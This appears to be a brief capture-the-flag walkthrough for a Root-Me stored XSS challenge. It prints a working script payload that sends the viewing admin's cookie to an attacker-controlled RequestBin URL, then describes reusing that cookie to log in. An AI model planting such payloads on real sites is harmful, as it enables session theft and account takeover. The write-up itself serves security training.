## Challenge name: XSS - Stored 1

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)

**The challenge provides a forum with a POST form. The 'Message' input field is vulnerable to stored XSS.**

**Create a RequestBin to capture HTTP requests. Then inject a payload that exfiltrates cookies:**

```javascript
<script>document.write("<img src='https://your-requestbin.url/"+document.cookie+"'></img>");</script>
```

**The payload will be stored on the server. When the admin views the page, the JavaScript executes and sends the admin's cookie to your RequestBin.**

**Use the captured ADMIN_COOKIE to authenticate and retrieve the flag/password.**

**Thankyou.**
